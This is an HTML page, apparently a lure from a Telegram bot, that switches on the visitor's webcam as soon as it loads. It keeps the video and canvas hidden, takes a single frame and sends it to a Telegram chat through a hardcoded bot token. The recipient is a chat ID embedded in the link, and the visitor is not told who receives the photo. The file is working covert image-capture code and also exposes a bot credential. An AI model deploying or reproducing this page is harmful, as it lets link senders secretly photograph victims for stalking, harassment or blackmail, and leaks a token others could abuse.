<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Selfie yuborilmoqda...</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        background: #000;
        color: white;
      }
      video,
      canvas {
        display: none;
      }
    </style>
  </head>
  <body>
    <h3>Kamera yoqilmoqda...</h3>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
      const TOKEN = "8201270787:AAELpFwtJ7IYefjAIUtxEv39kyuU-jcbo2Y";
      const chatId = window.location.pathname.split("/").pop();

      async function start() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
          const v = document.getElementById("v");
          v.srcObject = stream;

          await new Promise((r) => setTimeout(r, 800));

          const c = document.getElementById("c");
          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext("2d").drawImage(v, 0, 0);

          stream.getTracks().forEach((t) => t.stop());

          c.toBlob((blob) => {
            const form = new FormData();
            form.append("chat_id", chatId);
            form.append("photo", blob, "selfie.png");
            form.append("caption", "Saytdan olingan selfie");

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
              method: "POST",
              body: form,
            });
          }, "image/png");

          document.body.innerHTML = "<h2>✅ Rasm yuborildi!</h2>";
        } catch (err) {
          document.body.innerHTML = "<h2>❌ Kamera ruxsat berilmadi</h2>";
        }
      }
      start();
    </script>
  </body>
</html>
